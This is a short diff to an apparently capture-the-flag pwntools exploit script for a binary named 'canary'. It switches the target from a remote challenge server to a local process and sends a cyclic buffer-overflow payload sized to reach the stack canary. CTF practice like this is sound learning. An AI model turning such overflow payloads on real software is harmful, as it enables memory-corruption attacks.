@@ -4,8 +4,7 @@ context.arch = "amd64"
 context.log_level = "debug"
 
 elf = ELF("../attachments/canary")
-# io = process("../attachments/canary")
-io = remote("121.40.70.24", 33747)
+io = process("../attachments/canary")
 
 payload = cyclic(0x50 - 0x8 + 1)
 io.sendafter(b"Enter your message (type 'exit' to quit): ", payload)
